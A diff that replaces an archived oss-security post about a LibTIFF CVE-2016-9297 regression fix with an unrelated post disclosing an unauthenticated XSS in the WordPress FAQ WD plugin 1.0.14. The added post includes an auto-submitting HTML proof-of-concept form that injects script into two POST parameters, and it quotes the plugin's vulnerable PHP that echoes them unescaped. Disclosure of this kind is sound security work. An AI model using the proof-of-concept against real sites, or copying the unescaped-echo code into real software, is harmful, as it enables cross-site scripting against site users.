@@ -1,34 +1,79 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/18/11
-Message-ID: <20161118150524.GA16744@tunkki>
-Date: Fri, 18 Nov 2016 17:05:24 +0200
-From: Henri Salo <henri@...v.fi>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/16/6
+Message-ID: <CAOmn9FRZhAZDacr=szRqSYdxD5R_c_FinN=Zg6wdehO2M+qTzQ@mail.gmail.com>
+Date: Sat, 16 Apr 2016 14:01:20 +0530
+From: shravan kumar <cor3sm4sh3r@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2016-9297 LibTIFF regression
+Subject: Unauthenticated XSS Vulnerability in WORDPRESS FAQ WD plugin 1.0.14.
 Content-Type: text/plain; charset=utf-8
 
-CVE-2016-9297 vulnerability reported in http://bugzilla.maptools.org/show_bug.cgi?id=2590 had a
-regression, which is fixed in http://bugzilla.maptools.org/show_bug.cgi?id=2593
-by Even Rouault.
+Hello,
 
-Fixed per
+I would like to report a Unauthenticated XSS vulnerability in FAQ WD
+ plugin version 1.0.14 .
 
-2016-11-16 Even Rouault <even.rouault at spatialys.com>
+The Plugin can be found at https://wordpress.org/plugins/faq-wd/
 
-        * libtiff/tif_dirread.c: in TIFFFetchNormalTag(), do not dereference
-        NULL pointer when values of tags with TIFF_SETGET_C16_ASCII /
-TIFF_SETGET_C32_ASCII
-        access are 0-byte arrays.
-        Fixes http://bugzilla.maptools.org/show_bug.cgi?id=2593 (regression
-introduced
-        by previous fix done on 2016-11-11 for CVE-2016-9297).
-        Reported by Henri Salo.
+This Bug can be triggered by unauthenticated / Authenticated user. If a
+user is sent a URL by social engineering and the user clicks the link the
+bug can be triggred.
 
-/cvs/maptools/cvsroot/libtiff/ChangeLog,v  <--  ChangeLog
-new revision: 1.1163; previous revision: 1.1162
-/cvs/maptools/cvsroot/libtiff/libtiff/tif_dirread.c,v  <-- 
-libtiff/tif_dirread.c
-new revision: 1.204; previous revision: 1.203
+The URL should be something like this
+
+http://attackerssite.com/XSS_POC.html
+
+
+
+The code for XSS_POC.html is as follows:
+
+
+<html>
+  <body onload="document.forms['xss'].submit()" >
+    <form name="xss" action="
+http://targetsite/wpinstallation/wp-content/plugins/faq-wd/lang/views/SLangViewPo.php"
+method="POST" >
+
+  <input type="hidden" name="lang_err_mess" value="
+<script>alert(1);</script>" />
+<input type="hidden" name="lang_success_synchron" value="
+<script>alert(2);</script>" />
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+
+Techinical Details:
+
+The vulnerable page is
+
+wp-content/plugins/faq-wd/lang/views/SLangViewPo.php
+
+This page can be directly accessed by anyone.
+
+The Code responsible for the vulnerability :
+<?php if (isset($_POST['lang_err_mess'])): ?>
+    <div class="error" style="display: inline-block;width: 100%"><p><?php
+echo $_POST['lang_err_mess']; ?></p></div>
+<?php elseif (isset($_POST['lang_success'])): ?>
+    <div class="updated" style="display: inline-block;width: 100%"><p><?php
+echo 'File was successfully updated.'; ?></p></div>
+<?php endif; ?>
+<?php if (isset($_POST['lang_success_synchron'])): ?>
+    <div class="updated" style="display: inline-block;width: 100%"><p><?php
+echo $_POST['lang_success_synchron']; ?></p></div>
+<?php endif; ?>
+
+
+Here we can see that there are two post request which are displayed in
+unsafe manner while rendering the page.
+
+The vulnerable POST parameters are:
+
+   - $_POST['lang_err_mess']
+   - $_POST['lang_success_synchron']
+
 
 -- 
-Henri Salo
+Shravan Kumar
+
